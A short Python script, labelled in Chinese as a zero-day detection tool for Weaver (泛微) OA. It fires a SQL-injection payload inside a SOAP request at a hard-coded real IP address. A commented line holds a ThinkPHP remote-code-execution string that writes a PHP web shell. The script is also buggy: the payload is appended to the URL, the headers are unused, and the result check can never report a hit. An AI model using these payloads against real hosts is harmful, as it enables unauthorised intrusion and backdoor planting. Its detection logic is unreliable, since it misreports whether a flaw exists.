# 洞悉之眼 - 泛微OA Oday漏洞检测脚本
import requests
import httplib2

#'http://222.190.137.42:8082/webservice/document/document.wsdl.php'#
url_thinkphp = 'http://222.190.137.42:8082/webservice/document/document.wsdl.php'
#按照请求需求添加
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21',
    'SOAPAction': 'urn:DocumentServicewsdl#GetDocumentContent',
    'X-Requested-With': 'XMLHttpRequest',
    'Cookie': ' LOGIN_LANG=cn',
    'Connection': ' Keep-alive'
}
#如果存在不匹配 使用r
#漏洞参数
payload = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="urn:DocumentServicewsdl">' \
       '<SOAP-ENV:Header/>' \
       '<SOAP-ENV:Body>' \
       '<GetDocumentContent>' \
       '<documentID>1</documentID>' \
       '<searchCondition>-1&apos; OR 3*2*1=6 AND 000662=000662 -- </searchCondition>' \
       '<orderBy>1</orderBy>' \
       '<limitOffset>1</limitOffset>' \
        '<limitRows>1</limitRows>' \
        '</GetDocumentContent>' \
        '</SOAP-ENV:Body>' \
        '</SOAP-ENV:Envelope>'
# payload1 = r'/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php'
url = url_thinkphp + payload
r = requests.post(url)
# print(r.text)
#
vlun = '登录'#漏洞特征 或者说是值

vluns = vlun in r.text#取漏洞特征

if vluns == vlun:
    print(url_thinkphp + ('+       存在注入漏洞'))
else:
    print(url_thinkphp + ('        漏洞不存在'))

